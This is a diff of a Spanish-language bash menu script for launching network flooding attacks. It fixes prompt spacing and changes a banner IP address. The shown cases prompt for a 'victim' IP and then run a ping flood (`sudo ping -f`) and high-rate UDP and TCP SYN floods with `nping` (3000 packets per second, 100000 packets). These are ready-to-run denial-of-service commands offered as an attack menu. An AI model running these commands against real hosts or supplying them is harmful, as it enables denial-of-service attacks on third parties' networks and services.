@@ -15,7 +15,7 @@ do
       echo "|----------------------------------------------------------|";
       echo "| 30 - Salir                                               |";
       echo "|----------------------------------------------------------|";
-      echo "|                     34.207.128.14                        |";
+      echo "|                     34.226.81.227                        |";
       echo "|----------------------------------------------------------|";
       echo "|----------------------------------------------------------|";
       echo "| 20 - TCP Attack                                          |";
@@ -203,11 +203,11 @@ do
         sudo ping -f $ip
         ;;
         19)
-        read -p "Dime la ip de la Víctima: "ip
+        read -p "Dime la ip de la Víctima: " ip
         nping --udp --flags syn --rate 3000 -c 100000 $ip
 	;;
         20)
-        read -p "Dime la ip de la Víctima: "ip
+        read -p "Dime la ip de la Víctima: "  ip
         nping --tcp --flags syn --rate 3000 -c 100000 $ip
 	;;
         30)
